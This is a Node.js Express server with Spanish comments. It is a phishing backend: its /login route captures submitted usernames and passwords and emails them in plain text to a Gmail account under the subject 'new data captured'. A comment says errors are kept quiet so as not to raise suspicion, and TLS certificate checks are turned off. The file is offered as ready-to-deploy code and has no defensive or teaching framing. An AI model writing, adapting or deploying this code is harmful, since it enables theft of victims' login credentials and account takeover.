require('dotenv').config();

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- CONFIGURACIÓN DE MIDDLEWARE ---
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true })); // Agregado por seguridad para formularios simples

// --- 1. ARCHIVOS ESTÁTICOS (TU PÁGINA WEB) ---
// Asegúrate de que tu carpeta se llame 'public' en minúsculas
app.use(express.static(path.join(__dirname, 'public')));

// --- 2. CONFIGURACIÓN ROBUSTA DE CORREO PARA RENDER ---
// Usamos puerto 587 que es el estándar para envíos desde la nube
const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // false para puerto 587
    auth: {
        user: 'paschasin1234@gmail.com',
        pass: process.env.GMAIL_PASSWORD // Asegúrate de tener esta variable en Render
    },
    tls: {
        rejectUnauthorized: false // CRUCIAL: Evita errores de certificados en servidores cloud
    }
});

// --- RUTA PARA RECIBIR LOS DATOS ---
app.post('/login', (req, res) => {
    const { usuario, password } = req.body;

    console.log(`Intento de envío: ${usuario}`);

    const mailOptions = {
        from: 'paschasin1234@gmail.com',
        to: 'paschasin1234@gmail.com',
        subject: '¡Nuevos datos capturados!',
        text: `Se han enviado nuevos datos del formulario:\n\nUsuario: ${usuario}\nContraseña: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error enviando correo:', error);
            // No le decimos al usuario que falló el correo para no levantar sospechas, 
            // o puedes devolver 500 si prefieres.
            res.status(500).send('Error interno'); 
        } else {
            console.log('Correo enviado con éxito: ' + info.response);
            res.status(200).send('Datos recibidos correctamente');
        }
    });
});

// --- RUTA DE PRUEBA (HEALTH CHECK) ---
// Si tu index.html falla, entra a tu-url.com/ping para ver si el servidor vive
app.get('/ping', (req, res) => {
    res.send('Pong! El servidor está vivo.');
});

// --- 3. INICIO DEL SERVIDOR ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo exitosamente en puerto ${PORT}`);
});